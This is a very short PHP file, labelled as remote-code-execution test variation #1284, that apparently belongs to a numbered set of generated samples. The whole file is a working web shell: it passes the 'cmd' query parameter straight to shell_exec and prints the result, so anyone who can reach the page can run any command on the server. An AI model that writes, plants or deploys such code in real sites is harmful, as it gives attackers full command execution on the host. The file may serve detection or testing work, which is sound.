<?php
// RCE test variation #1284
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>